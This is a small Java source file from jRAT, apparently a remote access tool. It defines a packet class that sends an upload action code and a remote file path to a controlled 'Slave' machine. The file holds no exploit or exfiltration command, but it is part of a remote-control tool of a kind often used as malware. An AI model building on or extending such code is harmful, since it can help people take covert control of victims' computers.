package jrat.module.fs.packets.upload;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;

public class Packet102UploadState implements OutgoingPacket {

    private int action;
	private String remote;
	
	public Packet102UploadState(int action, String remote) {
	    this.action = action;
	    this.remote = remote;
	}
	
	@Override
	public void write(Slave slave) throws Exception {
	    slave.writeByte(this.action);
		slave.writeLine(this.remote);
	}

	@Override
	public short getPacketId() {
		return 102;
	}

}
